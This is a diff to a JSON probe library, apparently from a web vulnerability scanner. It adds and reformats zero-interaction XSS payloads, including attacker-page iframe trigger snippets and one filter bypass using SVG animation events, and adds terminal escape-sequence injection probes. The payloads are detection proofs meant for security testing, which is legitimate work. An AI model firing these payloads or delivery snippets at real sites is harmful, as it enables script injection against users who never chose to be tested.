@@ -760,7 +760,7 @@
       ]
     },
     "auto_trigger_delivery": {
-      "description": "No-victim-interaction XSS delivery — event handlers that fire without a click. Some self-trigger on render (onanimationstart / onpageshow / SVG onbegin, no attacker page); others fire when an attacker page frames the target and manipulates the iframe (onhashchange / onresize / onscroll). The mechanism is delivery, not just the payload — each probe carries the attacker-page trigger snippet. See playbook-xss-delivery.md for the full decision table.",
+      "description": "No-victim-interaction XSS delivery \u2014 event handlers that fire without a click. Some self-trigger on render (onanimationstart / onpageshow / SVG onbegin, no attacker page); others fire when an attacker page frames the target and manipulates the iframe (onhashchange / onresize / onscroll). The mechanism is delivery, not just the payload \u2014 each probe carries the attacker-page trigger snippet. See playbook-xss-delivery.md for the full decision table.",
       "tech_match": [],
       "param_match": [
         "search",
@@ -778,7 +778,7 @@
       "probes": [
         {
           "payload": "<body onhashchange=alert(document.domain)>",
-          "description": "onhashchange auto-trigger via attacker iframe — inject the handler, then from an attacker page frame the target and append a fragment to fire it with zero victim interaction. Trigger: <iframe src=\"https://TARGET/?PARAM=<body onhashchange=alert(document.domain)>\" onload=\"this.src+='#x'\"></iframe>",
+          "description": "onhashchange auto-trigger via attacker iframe \u2014 inject the handler, then from an attacker page frame the target and append a fragment to fire it with zero victim interaction. Trigger: <iframe src=\"https://TARGET/?PARAM=<body onhashchange=alert(document.domain)>\" onload=\"this.src+='#x'\"></iframe>",
           "matchers": [
             {
               "type": "reflection",
@@ -793,7 +793,7 @@
         },
         {
           "payload": "<body onresize=alert(document.domain)>",
-          "description": "onresize auto-trigger via attacker iframe — resizing the frame fires the handler, no victim interaction. Trigger: <iframe src=\"https://TARGET/?PARAM=<body onresize=alert(document.domain)>\" onload=\"setTimeout(()=>this.style.width='100px',1000)\"></iframe>",
+          "description": "onresize auto-trigger via attacker iframe \u2014 resizing the frame fires the handler, no victim interaction. Trigger: <iframe src=\"https://TARGET/?PARAM=<body onresize=alert(document.domain)>\" onload=\"setTimeout(()=>this.style.width='100px',1000)\"></iframe>",
           "matchers": [
             {
               "type": "reflection",
@@ -808,7 +808,7 @@
         },
         {
           "payload": "<body onscroll=alert(document.domain)><div style=height:3000px></div>",
-          "description": "onscroll auto-trigger via attacker iframe — scrolling the framed target fires the handler. Trigger: <iframe src=\"https://TARGET/?PARAM=<body onscroll=alert(document.domain)><div style=height:3000px></div>\" onload=\"this.contentWindow.scrollTo(0,1000)\"></iframe>. Fallback when cross-origin scrollTo is blocked by SOP: append #id to the src and give the injected element that id so the browser auto-scrolls it into view.",
+          "description": "onscroll auto-trigger via attacker iframe \u2014 scrolling the framed target fires the handler. Trigger: <iframe src=\"https://TARGET/?PARAM=<body onscroll=alert(document.domain)><div style=height:3000px></div>\" onload=\"this.contentWindow.scrollTo(0,1000)\"></iframe>. Fallback when cross-origin scrollTo is blocked by SOP: append #id to the src and give the injected element that id so the browser auto-scrolls it into view.",
           "matchers": [
             {
               "type": "reflection",
@@ -823,7 +823,7 @@
         },
         {
           "payload": "<style>@keyframes x{from{opacity:0}to{opacity:1}}</style><xss style=\"animation-name:x\" onanimationstart=alert(document.domain)></xss>",
-          "description": "onanimationstart auto-trigger — the CSS @keyframes animation starts on render, firing the handler with ZERO interaction and no attacker page. Self-contained: the <style> block and the animated element are both in the payload.",
+          "description": "onanimationstart auto-trigger \u2014 the CSS @keyframes animation starts on render, firing the handler with ZERO interaction and no attacker page. Self-contained: the <style> block and the animated element are both in the payload.",
           "matchers": [
             {
               "type": "reflection",
@@ -836,7 +836,7 @@
         },
         {
           "payload": "<body onpageshow=alert(document.domain)>",
-          "description": "onpageshow auto-trigger — fires on initial load and on bfcache restore (browser back/forward), ZERO interaction, no attacker page needed.",
+          "description": "onpageshow auto-trigger \u2014 fires on initial load and on bfcache restore (browser back/forward), ZERO interaction, no attacker page needed.",
           "matchers": [
             {
               "type": "reflection",
@@ -849,7 +849,7 @@
         },
         {
           "payload": "<svg><animatetransform onbegin=alert(document.domain) attributeName=transform></svg>",
-          "description": "SVG SMIL onbegin auto-trigger — the animation begins on render, firing onbegin with ZERO interaction. Bypasses filters that blocklist only HTML on* handlers and miss SVG SMIL animation events.",
+          "description": "SVG SMIL onbegin auto-trigger \u2014 the animation begins on render, firing onbegin with ZERO interaction. Bypasses filters that blocklist only HTML on* handlers and miss SVG SMIL animation events.",
           "matchers": [
             {
               "type": "reflection",
@@ -859,6 +859,38 @@
           "severity": "high",
           "confidence_boost": 55,
           "variables": {}
+        }
+      ]
+    },
+    "terminal_escape_injection": {
+      "description": "Terminal escape sequence injection in web terminals (xterm.js, gotty, Wetty, ttyd, Shellinabox). Untrusted content rendered in a terminal emulator can inject DCS/OSC/CSI sequences to execute commands, change window title (phishing), or exfiltrate data. CVE-2026-41253 (iTerm2) showed this class reaches RCE. Web terminals are especially dangerous because they often run as the server user.",
+      "tech_match": [
+        "xterm",
+        "gotty",
+        "wetty",
+        "ttyd",
+        "shellinabox",
+        "terminal"
+      ],
+      "probes": [
+        {
+          "payload": "\u001b]0;pwned\u0007",
+          "description": "OSC title-set \u2014 if the terminal renders this, escape sequences are processed from content. Benign detection: changes window title to pwned.",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "pwned"
+              ]
+            }
+          ],
+          "reference_only": true
+        },
+        {
+          "payload": "\u001b[?1049h",
+          "description": "CSI alternate screen buffer \u2014 if terminal switches to alt buffer, escape processing is active on untrusted content",
+          "matchers": [],
+          "reference_only": true
         }
       ]
     }
